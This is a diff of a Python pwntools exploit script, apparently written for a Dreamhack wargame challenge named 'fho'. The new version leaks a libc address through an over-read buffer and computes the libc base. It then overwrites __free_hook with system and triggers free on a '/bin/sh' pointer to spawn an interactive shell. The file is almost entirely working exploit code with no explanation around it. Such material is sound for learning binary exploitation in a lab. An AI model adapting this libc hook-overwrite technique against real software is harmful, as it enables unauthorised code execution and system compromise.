@@ -1,21 +1,27 @@
-from pwn import *
+from pwn import*
 
-#p = remote('host3.dreamhack.games', '14038')
+context.log_level = 'debug'
+
+#p = remote('host3.dreamhack.games', '19564')
 p = process('./fho')
-e = ELF('./fho')
-libc = ELF('./libc-2.27.so')
+libc = ELF("./libc-2.27.so")
+free_hook_offset = libc.symbols['__free_hook']
+libc_start_main_offset = libc.symbols['__libc_start_main']
+system_offset = libc.symbols['system']
+binsh_offset = 0x1b3e1a
 
-# libc leak
-buf = b"A"*0x48
-p.sendafter(b"Buf: ", buf)
-p.recvuntil(buf)
-libc_start_main = u64(p.recvline()[:-1] + b'\x00'*2)
-print(hex(libc_start_main))
+p.sendafter(b"Buf: ", b"a"*0x48)
+p.recvuntil(b"a"*0x48)
+libc_start_main = u64(p.recv(6).ljust(8, b"\x00")) - 231
+libc_base = libc_start_main - libc_start_main_offset
+print(hex(libc_base))
 
-libc_base = libc_start_main - 
+free_hook = libc_base+ free_hook_offset
+binsh = libc_base + binsh_offset
+system = libc_base + system_offset
+
+p.sendlineafter(b"To write: ", str(free_hook).encode())
+p.sendlineafter(b"With: ", str(system).encode())
+p.sendlineafter(b"To free: ", str(binsh).encode())
 
 p.interactive()
-
-
-# libc6_2.27-3ubuntu1.4_amd64
-# https://wyv3rn.tistory.com/60
